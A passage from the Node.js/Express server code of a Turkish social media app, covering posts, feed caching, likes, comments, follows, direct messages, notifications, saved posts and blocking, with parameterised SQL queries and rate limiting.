        // ⚡ @Mention bildirimleri — gönderi içindeki @kullanıcı etiketleri
        if (content) {
            const mentionMatches = content.match(/@([\w.]+)/g);
            if (mentionMatches) {
                const uniqueMentions = [...new Set(mentionMatches.map(m => m.slice(1).toLowerCase()))];
                setImmediate(async () => {
                    for (const uname of uniqueMentions.slice(0, 10)) { // max 10 mention/gönderi
                        if (uname === req.user.username.toLowerCase()) continue; // kendini etiketleme
                        const mentioned = await dbGet(
                            'SELECT id FROM users WHERE LOWER(username) = $1 AND "isActive" = TRUE', [uname]
                        ).catch(() => null);
                        if (mentioned) {
                            createNotification(mentioned.id, 'mention',
                                `${req.user.username} sizi bir gönderide etiketledi`, {
                                    postId,
                                    actorName      : req.user.name || req.user.username,
                                    actorUsername  : req.user.username,
                                    actorProfilePic: req.user.profilePic || '',
                                });
                        }
                    }
                });
            }
        }

        // ⚡ Hashtag'leri PARALEL işle
        if (content) {
            const hashtagMatches = content.match(/#[\wığüşöçĞÜŞÖÇİ]+/g);
            if (hashtagMatches) {
                const uniqueTags = [...new Set(hashtagMatches.map(t => t.toLowerCase()))];
                await Promise.all(uniqueTags.map(async (cleanTag) => {
                    try {
                        const hId = uuidv4();
                        const result = await pool.query(
                            `INSERT INTO hashtags (id, tag, "postCount", "createdAt")
                             VALUES ($1, $2, 1, NOW())
                             ON CONFLICT (tag) DO UPDATE SET "postCount" = hashtags."postCount" + 1
                             RETURNING id`,
                            [hId, cleanTag]
                        );
                        const hashtagId = result.rows[0].id;
                        await pool.query(
                            `INSERT INTO post_hashtags (id, "postId", "hashtagId") VALUES ($1, $2, $3) ON CONFLICT DO NOTHING`,
                            [uuidv4(), postId, hashtagId]
                        );
                    } catch (e) { /* hashtag hatası postu engellemez */ }
                }));
            }
        }

        // ⚡ Video varsa ARKA PLANDA işle
        if (req._pendingVideo) {
            const { videoId, tempPath } = req._pendingVideo;
            console.log(`🎬 Arka planda video başlatılıyor: ${videoId}`);
            processVideoAsync(postId, tempPath, videoId).catch(err =>
                console.error(`❌ Arka plan video hatası (${videoId}):`, err.message)
            );
        }

        // ⚡ Bu kullanıcının feed cache'ini temizle
        AppCache.feed.delPattern(req.user.id + ':'); // Feed cache temizle (yeni post)

        // 🔔 Takipçilere "yeni gönderi" bildirimi gönder (arka planda, yanıtı bloke etmez)
        setImmediate(async () => {
            try {
                const followers = await dbAll(
                    `SELECT "followerId" FROM follows WHERE "followingId" = $1`,
                    [req.user.id]
                );
                if (followers && followers.length > 0) {
                    const postPreview = content ? content.substring(0, 60) : '';
                    for (const f of followers) {
                        createNotification(f.followerId, 'new_post', `${req.user.username} yeni bir gönderi paylaştı`, {
                            postId,
                            actorName      : req.user.name || req.user.username,
                            actorUsername  : req.user.username,
                            actorProfilePic: req.user.profilePic || '',
                            postPreview,
                        });
                    }
                }
            } catch (e) {
                console.error('[Takipçi bildirim hatası]', e.message);
            }
        });

        res.status(201).json({ success: true, message: 'Gönderi paylaşıldı', post: formatPost(postRow) });
    } catch (error) {
        console.error('Post oluşturma hatası:', error);
        if (req.files) { for (const f of req.files) { await fs.unlink(f.path).catch(() => {}); } }
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 11. FEED ───────────────────────────────────────────────────────
// ⚡ FEED ÖNBELLEK - kullanıcı başına 30 saniyelik cache (LRU)
// ✅ TAKIP FEED: Sadece takip edilen kullanıcıların gönderileri + kendi gönderileri
// AppCache.feed: 200 kullanıcı, 30s TTL, LRU eviction

app.get('/api/feed', authenticateToken, async (req, res) => {
    try {
        const { limit, page, offset } = safePagination(req.query, 20, 50);
        const cacheKey = `${req.user.id}:${page}:${limit}`;

        // ⚡ Cache hit → anında dön (AppCache.feed LRU)
        const cached = AppCache.feed.get(cacheKey);
        if (cached) return res.json(cached);

        // ⚡ Takip feed sorgusu:
        //   - Kendi gönderileri (p."userId" = $1)
        //   - Takip ettiklerinin gönderileri (EXISTS follows)
        //   - Engellenenler hariç (NOT EXISTS blocks)
        // Performans: idx_follows_followerId + idx_posts_active_created + idx_blocks_blocker
        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType", u.username as "authorUsername",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved",
                    (p."userId" = $1 OR TRUE) as "isFollowing"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE
               AND (
                    p."userId" = $1
                    OR EXISTS (
                        SELECT 1 FROM follows
                        WHERE "followerId" = $1 AND "followingId" = p."userId"
                    )
               )
               AND NOT EXISTS (SELECT 1 FROM blocks WHERE "blockerId" = $1 AND "blockedId" = p."userId")
               AND NOT EXISTS (SELECT 1 FROM blocks WHERE "blockerId" = p."userId" AND "blockedId" = $1)
             ORDER BY p."createdAt" DESC
             LIMIT $2 OFFSET $3`,
            [req.user.id, Math.min(Math.max(parseInt(limit)||20, 1), 200), Math.max(offset||0, 0)]
        );

        const responseData = {
            posts       : posts.map(formatPost),
            page        : parseInt(page),
            followingOnly: true,  // ← istemci bu flag'i kontrol edebilir
        };
        AppCache.feed.set(cacheKey, responseData); // ⚡ LRU cache'e kaydet
        res.json(responseData);
    } catch (error) {
        console.error('Feed hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 12. TEK POST ───────────────────────────────────────────────────
// ÖNEMLİ: saved, liked, popular, new gibi statik yollar ÖNCE tanımlanmalı.
app.get('/api/posts/:id', authenticateToken, async (req, res, next) => {
    const STATIC_POST_SEGS = ['saved', 'liked', 'popular', 'new', 'search', 'feed', 'trending'];
    if (STATIC_POST_SEGS.includes(req.params.id)) return next();
    // UUID değilse DB'ye gönderme
    if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(req.params.id))
        return res.status(400).json({ error: 'Geçersiz gönderi ID' });
    try {
        const post = await dbGet(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType", u.username as "authorUsername",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $2) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $2) as "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p.id = $1 AND p."isActive" = TRUE`,
            [req.params.id, req.user.id]
        );
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });

        await dbRun('UPDATE posts SET views = views + 1 WHERE id = $1', [req.params.id]).catch(() => {});

        res.json({ post: formatPost(post) });
    } catch (error) {
        console.error('Post getirme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 13. POST SİL ──────────────────────────────────────────────────
app.delete('/api/posts/:id', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet(
            'SELECT "userId", media, "mediaUrls", "thumbnailUrl" FROM posts WHERE id = $1',
            [req.params.id]
        );
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });
        if (post.userId !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ error: 'Yetkiniz yok' });
        }

        await dbRun('UPDATE posts SET "isActive" = FALSE, "updatedAt" = NOW() WHERE id = $1', [req.params.id]);
        res.json({ message: 'Gönderi silindi' });

        // Medya dosyalarını arka planda sil (yanıtı bloke etme)
        setImmediate(async () => {
            try {
                const toDelete = new Set();

                // Tek medya
                if (post.media) {
                    const rel = post.media.replace(/^https?:\/\/[^/]+/, '');
                    if (rel.startsWith('/uploads/')) {
                        toDelete.add(path.join(__dirname, 'public', rel));
                    }
                }
                // Thumbnail
                if (post.thumbnailUrl) {
                    const rel = post.thumbnailUrl.replace(/^https?:\/\/[^/]+/, '');
                    if (rel.startsWith('/uploads/')) {
                        toDelete.add(path.join(__dirname, 'public', rel));
                    }
                }
                // Çoklu medya
                if (post.mediaUrls) {
                    try {
                        const items = typeof post.mediaUrls === 'string'
                            ? JSON.parse(post.mediaUrls) : post.mediaUrls;
                        if (Array.isArray(items)) {
                            for (const item of items) {
                                const rel = (item.url || '').replace(/^https?:\/\/[^/]+/, '');
                                if (rel.startsWith('/uploads/')) {
                                    toDelete.add(path.join(__dirname, 'public', rel));
                                }
                            }
                        }
                    } catch (_) {}
                }

                for (const filePath of toDelete) {
                    await require('fs').promises.unlink(filePath).catch(() => {});
                }
                if (toDelete.size > 0) {
                    console.log(`🗑️  [Post Sil] ${toDelete.size} medya dosyası silindi (postId: ${req.params.id})`);
                }
            } catch (e) {
                console.error('[Post Sil] Dosya temizleme hatası:', e.message);
            }
        });
    } catch (error) {
        console.error('Post silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 14. KULLANICININ POSTLARı ──────────────────────────────────────
app.get('/api/users/:userId/posts', optionalAuth, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const param = req.params.userId;

        const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(param);
        let targetUserId = param;
        if (!isUUID) {
            const u = await dbGet('SELECT id FROM users WHERE username=$1 AND "isActive"=TRUE', [param.toLowerCase()]);
            if (!u) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
            targetUserId = u.id;
        }

        const viewerId = req.user?.id || null;

        // 🔒 GİZLİ HESAP — takipçi değilse post listesi boş döner
        if (targetUserId !== viewerId) {
            const owner = await dbGet(
                `SELECT "isPrivate", ${viewerId ? `EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=$2) AS "isFollowing"` : 'FALSE AS "isFollowing"'}
                 FROM users WHERE id=$2`,
                viewerId ? [viewerId, targetUserId] : [targetUserId]
            );
            if (owner?.isPrivate && !owner?.isFollowing) {
                return res.json({ posts: [], total: 0, page: parseInt(page), isPrivate: true });
            }
        }

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u.username as "authorUsername",
                    ${viewerId ? `EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved"` : 'FALSE as "isLiked", FALSE as "isSaved"'}
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p."userId" = $2 AND p."isActive" = TRUE
             ORDER BY p."createdAt" DESC
             LIMIT $3 OFFSET $4`,
            viewerId ? [viewerId, targetUserId, parseInt(limit), offset] : [targetUserId, parseInt(limit), offset]
        );

        const total = await dbGet('SELECT COUNT(*) as c FROM posts WHERE "userId"=$1 AND "isActive"=TRUE', [targetUserId]);
        res.json({ posts: posts.map(formatPost), total: parseInt(total?.c || 0), page: parseInt(page) });
    } catch (error) {
        console.error('Kullanıcı postları hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 15. BEĞENİ ────────────────────────────────────────────────────
app.post('/api/posts/:id/like', authenticateToken, likeLimiter, checkRestriction('like'), async (req, res) => {
    try {
        const postId = req.params.id;
        const existing = await dbGet('SELECT id FROM likes WHERE "postId" = $1 AND "userId" = $2', [postId, req.user.id]);

        if (existing) {
            await dbRun('DELETE FROM likes WHERE id = $1', [existing.id]);
            await dbRun('UPDATE posts SET "likeCount" = GREATEST("likeCount" - 1, 0), "updatedAt" = NOW() WHERE id = $1', [postId]);
            res.json({ liked: false });
        } else {
            await dbRun('INSERT INTO likes (id, "postId", "userId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("postId", "userId") DO NOTHING', [uuidv4(), postId, req.user.id]);
            await dbRun('UPDATE posts SET "likeCount" = "likeCount" + 1, "updatedAt" = NOW() WHERE id = $1', [postId]);

            const post = await dbGet('SELECT "userId", content FROM posts WHERE id = $1', [postId]);
            if (post && post.userId !== req.user.id) {
                const postPreview = post.content ? post.content.substring(0, 60) : '';
                createNotification(post.userId, 'like', `${req.user.username} gönderinizi beğendi`, {
                    postId,
                    userId          : req.user.id,
                    actorName       : req.user.name || req.user.username,
                    actorUsername   : req.user.username,
                    actorProfilePic : req.user.profilePic || '',
                    postPreview,
                });
            }
            res.json({ liked: true });
        }
    } catch (error) {
        console.error('Beğeni hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 16. YORUM YAP ─────────────────────────────────────────────────
app.post('/api/posts/:id/comments', authenticateToken, commentLimiter, checkRestriction('comment'), async (req, res) => {
    try {
        const { content, parentId } = req.body;
        if (!content || !content.trim()) return res.status(400).json({ error: 'Yorum boş olamaz' });

        const post = await dbGet('SELECT "userId", "allowComments" FROM posts WHERE id = $1 AND "isActive" = TRUE', [req.params.id]);
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });
        if (!post.allowComments) return res.status(403).json({ error: 'Yorumlar kapalı' });

        const commentId = uuidv4();
        await dbRun(
            `INSERT INTO comments (id, "postId", "userId", username, content, "parentId", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, NOW(), NOW())`,
            [commentId, req.params.id, req.user.id, req.user.username, content.substring(0, 2000), parentId || null]
        );

        await dbRun('UPDATE posts SET "commentCount" = "commentCount" + 1, "updatedAt" = NOW() WHERE id = $1', [req.params.id]);

        if (post.userId !== req.user.id) {
            createNotification(post.userId, 'comment', `${req.user.username} gönderinize yorum yaptı`, {
                postId         : req.params.id,
                commentId,
                actorName      : req.user.name || req.user.username,
                actorUsername  : req.user.username,
                actorProfilePic: req.user.profilePic || '',
                commentContent : content.substring(0, 100),
            });
        }

        // @mention bildirimleri — yorum içindeki etiketler
        const commentMentions = content.match(/@([\w.]+)/g);
        if (commentMentions) {
            const uniqueMentions = [...new Set(commentMentions.map(m => m.slice(1).toLowerCase()))];
            setImmediate(async () => {
                for (const uname of uniqueMentions.slice(0, 5)) {
                    if (uname === req.user.username.toLowerCase()) continue;
                    const mentioned = await dbGet(
                        'SELECT id FROM users WHERE LOWER(username) = $1 AND "isActive" = TRUE', [uname]
                    ).catch(() => null);
                    if (mentioned && mentioned.id !== post.userId) { // post sahibi zaten bildirim aldı
                        createNotification(mentioned.id, 'mention',
                            `${req.user.username} bir yorumda sizi etiketledi`, {
                                postId: req.params.id,
                                commentId,
                                actorName      : req.user.name || req.user.username,
                                actorUsername  : req.user.username,
                                actorProfilePic: req.user.profilePic || '',
                            });
                    }
                }
            });
        }

        const comment = await dbGet('SELECT * FROM comments WHERE id = $1', [commentId]);
        res.status(201).json({ comment });
    } catch (error) {
        console.error('Yorum hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 17. YORUMLARI GETİR ───────────────────────────────────────────
app.get('/api/posts/:id/comments', optionalAuth, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const viewerId = req.user?.id || null;

        const comments = await dbAll(
            `SELECT c.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge",
                    ${viewerId ? `EXISTS(SELECT 1 FROM comment_likes WHERE "commentId" = c.id AND "userId" = $1) as "isLiked"` : 'FALSE as "isLiked"'}
             FROM comments c
             JOIN users u ON c."userId" = u.id
             WHERE c."postId" = $2
             ORDER BY c."createdAt" ASC
             LIMIT $3 OFFSET $4`,
            viewerId ? [viewerId, req.params.id, parseInt(limit), offset] : [req.params.id, parseInt(limit), offset]
        );

        res.json({ comments: comments.map(c => ({ ...c, profilePic: absoluteUrl(c.profilePic) })) });
    } catch (error) {
        console.error('Yorumlar hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 18. TAKİP ET/BIRAK ────────────────────────────────────────────
app.post('/api/users/:id/follow', authenticateToken, followLimiter, checkRestriction('follow'), async (req, res) => {
    try {
        const targetId = req.params.id;
        if (targetId === req.user.id) return res.status(400).json({ error: 'Kendinizi takip edemezsiniz' });

        const blocked = await dbGet('SELECT id FROM blocks WHERE ("blockerId" = $1 AND "blockedId" = $2) OR ("blockerId" = $2 AND "blockedId" = $1)', [req.user.id, targetId]);
        if (blocked) return res.status(403).json({ error: 'Engellenen kullanıcı' });

        const existing = await dbGet('SELECT id FROM follows WHERE "followerId" = $1 AND "followingId" = $2', [req.user.id, targetId]);

        if (existing) {
            await dbRun('DELETE FROM follows WHERE id = $1', [existing.id]);
            res.json({ following: false });
        } else {
            await dbRun('INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING', [uuidv4(), req.user.id, targetId]);
            createNotification(targetId, 'follow', `${req.user.username} sizi takip etmeye başladı`, {
                userId         : req.user.id,
                actorName      : req.user.name || req.user.username,
                actorUsername  : req.user.username,
                actorProfilePic: req.user.profilePic || '',
            });
            res.json({ following: true });
        }
    } catch (error) {
        console.error('Takip hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 19. TAKİPÇİLER ────────────────────────────────────────────────
app.get('/api/users/:id/followers', optionalAuth, async (req, res) => {
    try {
        const viewerId = req.user?.id || null;
        const isSelf = viewerId && req.params.id === viewerId;
        if (!isSelf) {
            const owner = await dbGet(
                `SELECT "isPrivate", ${viewerId ? `EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=$2) AS "isFollowing"` : 'FALSE AS "isFollowing"'}
                 FROM users WHERE id=$2`,
                viewerId ? [viewerId, req.params.id] : [req.params.id]
            );
            if (owner?.isPrivate && !owner?.isFollowing) {
                return res.json({ followers: [], isPrivate: true });
            }
        }
        const followers = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge",
                    ${viewerId ? `EXISTS(SELECT 1 FROM follows WHERE "followerId" = $2 AND "followingId" = u.id) as "isFollowing"` : 'FALSE as "isFollowing"'}
             FROM follows f
             JOIN users u ON f."followerId" = u.id
             WHERE f."followingId" = $1
             ORDER BY f."createdAt" DESC`,
            viewerId ? [req.params.id, viewerId] : [req.params.id]
        );
        res.json({ followers: followers.map(u => ({ ...u, profilePic: absoluteUrl(u.profilePic) })) });
    } catch (error) {
        console.error('Takipçiler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 20. TAKİP EDİLENLER ───────────────────────────────────────────
app.get('/api/users/:id/following', optionalAuth, async (req, res) => {
    try {
        const viewerId = req.user?.id || null;
        const isSelf = viewerId && req.params.id === viewerId;
        if (!isSelf) {
            const owner = await dbGet(
                `SELECT "isPrivate", ${viewerId ? `EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=$2) AS "isFollowing"` : 'FALSE AS "isFollowing"'}
                 FROM users WHERE id=$2`,
                viewerId ? [viewerId, req.params.id] : [req.params.id]
            );
            if (owner?.isPrivate && !owner?.isFollowing) {
                return res.json({ following: [], isPrivate: true });
            }
        }
        const following = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge",
                    ${viewerId ? `EXISTS(SELECT 1 FROM follows WHERE "followerId" = $2 AND "followingId" = u.id) as "isFollowing"` : 'FALSE as "isFollowing"'}
             FROM follows f
             JOIN users u ON f."followingId" = u.id
             WHERE f."followerId" = $1
             ORDER BY f."createdAt" DESC`,
            viewerId ? [req.params.id, viewerId] : [req.params.id]
        );
        res.json({ following: following.map(u => ({ ...u, profilePic: absoluteUrl(u.profilePic) })) });
    } catch (error) {
        console.error('Takip edilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 21. MESAJ GÖNDER ───────────────────────────────────────────────
// 🔒 Mesaj rate limit — kullanıcı başına dakikada max 30 mesaj (flood/spam koruması)
const messageLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 dakika
    max: 30,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req, res) => req.user?.id || rateLimit.ipKeyGenerator(req, res),
    message: { error: 'Çok hızlı mesaj gönderiyorsunuz. Lütfen bir dakika bekleyin.' },
    skip: (req) => process.env.NODE_ENV === 'test',
});

app.post('/api/messages', authenticateToken, messageLimiter, checkRestriction('message'), async (req, res) => {
    try {
        const { recipientId, content } = req.body;
        if (!recipientId || !content) return res.status(400).json({ error: 'Alıcı ve mesaj gerekli' });

        const blocked = await dbGet('SELECT id FROM blocks WHERE ("blockerId" = $1 AND "blockedId" = $2) OR ("blockerId" = $2 AND "blockedId" = $1)', [req.user.id, recipientId]);
        if (blocked) return res.status(403).json({ error: 'Bu kullanıcıya mesaj gönderemezsiniz' });

        const recipient = await dbGet('SELECT id, username FROM users WHERE id = $1 AND "isActive" = TRUE', [recipientId]);
        if (!recipient) return res.status(404).json({ error: 'Alıcı bulunamadı' });

        const msgId = uuidv4();
        await dbRun(
            `INSERT INTO messages (id, "senderId", "senderUsername", "recipientId", "recipientUsername", content, "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, NOW(), NOW())`,
            [msgId, req.user.id, req.user.username, recipientId, recipient.username, content.substring(0, 5000)]
        );

        createNotification(recipientId, 'message', `${req.user.username} size mesaj gönderdi`, {
            senderId       : req.user.id,
            actorName      : req.user.name || req.user.username,
            actorUsername  : req.user.username,
            actorProfilePic: req.user.profilePic || '',
            messagePreview : content.substring(0, 100),
        });

        res.status(201).json({ message: 'Mesaj gönderildi', id: msgId });
    } catch (error) {
        console.error('Mesaj hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ══════════════════════════════════════════════════════════════════
// 🔓 MESAJ İÇERİĞİ DECRYPT GUARD
// DB'de hâlâ pgcrypto ile şifrelenmiş kayıt kalırsa okunabilir hale getirir.
// Migration rollback yeterli olmalı ama ek güvence olarak okuma noktalarında da çalışır.
// ══════════════════════════════════════════════════════════════════
function safeDecryptContent(content) {
    if (!content || typeof content !== 'string') return content;
    // pgcrypto çıktısı hex string olarak gelir: À...
    // Eğer bu formattaysa ve DB_ENCRYPTION_KEY varsa decrypt dene
    if (DB_ENCRYPTION_KEY && (content.startsWith('\\xc0') || content.startsWith('\xc0'))) {
        // Bu durumda DB sorgu seviyesinde decrypt edilmeli
        // Application layer'da bytea decrypt edemeyiz güvenli şekilde
        // → "[Şifreli mesaj - yeniden giriş yapın]" göster
        return '[Mesaj yeniden yükleniyor...]';
    }
    return content;
}

function decryptMessages(messages) {
    if (!Array.isArray(messages)) return messages;
    return messages.map(m => ({ ...m, content: safeDecryptContent(m.content) }));
}


// ─── 22. SOHBET LİSTESİ ────────────────────────────────────────────
app.get('/api/messages/conversations', authenticateToken, async (req, res) => {
    try {
        // ⚡ N+1 sorgu yerine tek JOIN — her konuşma için ayrı DB çağrısı yok
        const conversations = await dbAll(
            `SELECT DISTINCT ON (partner_id)
                sub.*,
                u.name          AS partner_name,
                u.username      AS partner_username_full,
                u."profilePic"  AS partner_profile_pic,
                u."isVerified"  AS partner_is_verified,
                u."isOnline"    AS partner_is_online,
                (
                    SELECT COUNT(*) FROM messages uc
                    WHERE uc."senderId" = sub.partner_id
                      AND uc."recipientId" = $1
                      AND uc.read = FALSE
                ) AS unread_count
             FROM (
                 SELECT m.*,
                        CASE WHEN m."senderId" = $1 THEN m."recipientId"   ELSE m."senderId"   END AS partner_id,
                        CASE WHEN m."senderId" = $1 THEN m."recipientUsername" ELSE m."senderUsername" END AS partner_uname
                 FROM messages m
                 WHERE m."senderId" = $1 OR m."recipientId" = $1
             ) sub
             JOIN users u ON u.id = sub.partner_id
             ORDER BY partner_id, sub."createdAt" DESC`,
            [req.user.id]
        );

        const safeConversations = conversations.map(c => ({
            id            : c.id,
            content       : safeDecryptContent(c.content),
            mediaType     : c.mediaType || null,
            createdAt     : c.createdAt,
            partner: {
                id         : c.partner_id,
                username   : c.partner_uname,
                name       : c.partner_name,
                profilePic : absoluteUrl(c.partner_profile_pic),
                isVerified : c.partner_is_verified,
                isOnline   : c.partner_is_online,
            },
            unreadCount: parseInt(c.unread_count || 0),
        }));

        // Son mesaja göre sırala
        safeConversations.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

        res.json({ conversations: safeConversations });
    } catch (error) {
        console.error('Sohbet listesi hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 23. MESAJ GEÇMİŞİ ─────────────────────────────────────────────
app.get('/api/messages/:userId', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 50 } = req.query;
        const pn = Math.max(parseInt(page)||1, 1);
        const ln = Math.min(Math.max(parseInt(limit)||20, 1), 200);
        const offset = (pn - 1) * ln;

        const messages = await dbAll(
            `SELECT id, "senderId", "senderUsername", "recipientId", "recipientUsername",
                    content, "mediaUrl", "mediaType", read, "readAt", "createdAt", "updatedAt"
             FROM messages
             WHERE ("senderId" = $1 AND "recipientId" = $2) OR ("senderId" = $2 AND "recipientId" = $1)
             ORDER BY "createdAt" DESC
             LIMIT $3 OFFSET $4`,
            [req.user.id, req.params.userId, ln, offset]
        );

        // Okunmamış mesajları okundu işaretle
        await dbRun(
            `UPDATE messages SET read = TRUE, "readAt" = NOW()
             WHERE "senderId" = $1 AND "recipientId" = $2 AND read = FALSE`,
            [req.params.userId, req.user.id]
        );

        const processed = messages.reverse().map(m => ({
            ...m,
            content   : safeDecryptContent(m.content),
            mediaUrl  : m.mediaUrl ? absoluteUrl(m.mediaUrl) : null,
            // Sesli mesaj için alias
            voiceUrl  : m.mediaType === 'voice' ? absoluteUrl(m.mediaUrl) : null,
        }));

        res.json({ messages: processed });
    } catch (error) {
        console.error('Mesaj geçmişi hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 24. BİLDİRİMLER ───────────────────────────────────────────────
app.get('/api/notifications', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 30 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        const notifications = await dbAll(
            `SELECT * FROM notifications WHERE "userId" = $1 ORDER BY "createdAt" DESC LIMIT $2 OFFSET $3`,
            [req.user.id, Math.min(Math.max(parseInt(limit)||20, 1), 200), Math.max(offset||0, 0)]
        );

        const unreadCount = await dbGet(
            'SELECT COUNT(*) as count FROM notifications WHERE "userId" = $1 AND read = FALSE',
            [req.user.id]
        );

        res.json({ notifications, unreadCount: parseInt(unreadCount?.count || 0) });
    } catch (error) {
        console.error('Bildirimler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 25. BİLDİRİMLERİ OKUNDU YAP ───────────────────────────────────
app.put('/api/notifications/read', authenticateToken, async (req, res) => {
    try {
        const { ids } = req.body;
        if (ids && Array.isArray(ids)) {
            const placeholders = ids.map((_, i) => `$${i + 2}`).join(',');
            await pool.query(
                `UPDATE notifications SET read = TRUE, "readAt" = NOW() WHERE "userId" = $1 AND id IN (${placeholders})`,
                [req.user.id, ...ids]
            );
        } else {
            await dbRun('UPDATE notifications SET read = TRUE, "readAt" = NOW() WHERE "userId" = $1', [req.user.id]);
        }
        res.json({ message: 'Bildirimler okundu' });
    } catch (error) {
        console.error('Bildirim okuma hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 26. POST KAYDET ────────────────────────────────────────────────
app.post('/api/posts/:id/save', authenticateToken, async (req, res) => {
    try {
        const postId = req.params.id;
        const existing = await dbGet('SELECT id FROM saves WHERE "postId" = $1 AND "userId" = $2', [postId, req.user.id]);

        if (existing) {
            await dbRun('DELETE FROM saves WHERE id = $1', [existing.id]);
            await dbRun('UPDATE posts SET "saveCount" = GREATEST("saveCount" - 1, 0) WHERE id = $1', [postId]);
            res.json({ saved: false });
        } else {
            await dbRun('INSERT INTO saves (id, "postId", "userId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("postId", "userId") DO NOTHING', [uuidv4(), postId, req.user.id]);
            await dbRun('UPDATE posts SET "saveCount" = "saveCount" + 1 WHERE id = $1', [postId]);
            res.json({ saved: true });
        }
    } catch (error) {
        console.error('Kaydetme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 27. KAYDEDİLENLER ─────────────────────────────────────────────
app.get('/api/saved', authenticateToken, async (req, res) => {
    try {
        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified",
                    TRUE as "isSaved",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked"
             FROM saves s
             JOIN posts p ON s."postId" = p.id
             JOIN users u ON p."userId" = u.id
             WHERE s."userId" = $1 AND p."isActive" = TRUE
             ORDER BY s."createdAt" DESC`,
            [req.user.id]
        );
        res.json({ posts: posts.map(formatPost) });
    } catch (error) {
        console.error('Kaydedilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 28. ENGELLE ────────────────────────────────────────────────────
app.post('/api/users/:id/block', authenticateToken, async (req, res) => {
    try {
        const targetId = req.params.id;
        if (targetId === req.user.id) return res.status(400).json({ error: 'Kendinizi engelleyemezsiniz' });

        const existing = await dbGet('SELECT id FROM blocks WHERE "blockerId" = $1 AND "blockedId" = $2', [req.user.id, targetId]);

        if (existing) {
            await dbRun('DELETE FROM blocks WHERE id = $1', [existing.id]);
            res.json({ blocked: false });
        } else {
            await dbRun('INSERT INTO blocks (id, "blockerId", "blockedId", "createdAt") VALUES ($1, $2, $3, NOW())', [uuidv4(), req.user.id, targetId]);
